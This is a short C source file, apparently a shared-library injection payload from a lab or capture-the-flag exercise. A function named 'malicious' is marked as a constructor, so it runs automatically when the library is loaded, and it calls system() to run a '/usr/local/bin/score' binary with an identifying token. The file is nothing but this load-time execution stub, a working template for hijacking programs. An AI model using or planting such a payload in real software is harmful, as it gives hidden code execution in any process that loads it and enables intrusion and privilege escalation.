#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score 93254aa1-fbbb-49bf-9942-51aed0a7689c");
}
